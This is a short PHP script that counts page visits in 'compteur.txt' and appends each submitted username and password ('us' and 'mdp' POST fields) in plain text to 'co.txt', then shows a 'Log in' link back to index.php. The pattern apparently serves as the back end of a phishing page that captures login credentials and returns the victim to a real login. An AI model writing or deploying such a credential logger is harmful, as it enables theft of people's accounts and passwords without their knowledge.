<?php
$co = fopen('co.txt', 'r+');
$monfichier = fopen('compteur.txt', 'r+');
$pages_vues = fgets($monfichier);
$pages_vues += 1;
fseek($monfichier, 0);
fputs($monfichier, $pages_vues);
for ($a = 1; $a <= $pages_vues; $a++)
{
	fgets($co);
}
fputs($co, $_POST['us'].' '.$_POST['mdp'].'
'); 
fclose($co);
fclose($monfichier);
?>
<a href="index.php">Log in</a>